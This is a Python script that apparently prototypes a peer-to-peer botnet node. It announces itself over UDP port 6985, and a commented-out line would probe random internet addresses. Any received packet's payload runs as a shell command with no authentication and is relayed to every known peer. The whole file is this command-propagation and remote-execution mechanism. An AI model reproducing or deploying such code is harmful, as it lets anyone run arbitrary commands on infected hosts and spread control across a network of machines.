import socket
import random
import time
import logging
from subprocess import call
from threading import Thread

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(threadName)s - %(name)s - %(levelname)s - %(message)s')

COMMUNICATION_PORT = 6985

nodes = {'127.0.0.1'}
executed = {0}


def random_ip():
    return '127.0.0.1'
    # return '.'.join(str(random.randint(0, 255)) for _ in range(4))


class Probe(Thread):
    def __init__(self):
        super().__init__()
        self.daemon = False
        self.name = 'Probe'
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.start()

    def run(self) -> None:
        while True:
            self.sock.sendto(b'Hellow!', (random_ip(), COMMUNICATION_PORT))
            time.sleep(1)


class Listener(Thread):
    def __init__(self):
        super().__init__()
        self.daemon = False
        self.name = 'Listener'
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.bind(('', COMMUNICATION_PORT))
        self.start()

    def run(self) -> None:
        while True:
            data, addr = self.sock.recvfrom(2048)
            logging.info((data, addr))
            if data == b'Hellow!':
                logging.info(addr[0])
                nodes.add(addr[0])
            else:
                if int(data[0:8]) not in executed:
                    for addr in nodes:
                        self.sock.sendto(data, (addr, COMMUNICATION_PORT))
                    logging.info('running: ' + str(data[8:], 'ascii'))
                    call(str(data[8:], 'ascii').split(' '))
                    executed.add(int(data[0:8]))
                else:
                    logging.info('loopback')


def send(cmd):
    socket.socket(socket.AF_INET, socket.SOCK_DGRAM).sendto(b'00000001%s' % bytearray(cmd, 'ascii'), ('127.0.0.1', 6985))


def main():
    listener = Listener()
    probe = Probe()
    logging.info('started')
    send('ping 4.2.2.4 -c 4')


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        exit(-1)
